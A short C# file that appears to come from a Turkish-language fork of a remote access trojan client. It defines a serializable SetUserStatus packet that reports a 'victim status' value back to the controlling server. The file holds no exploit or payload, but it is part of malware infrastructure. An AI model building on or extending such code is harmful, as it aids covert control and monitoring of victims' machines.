using System;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.Enumlar;

namespace xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class SetUserStatus : IPacket
    {
        public KurbanDurumu Message { get; set; }

        public SetUserStatus()
        {
        }

        public SetUserStatus(KurbanDurumu message)
        {
            Message = message;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}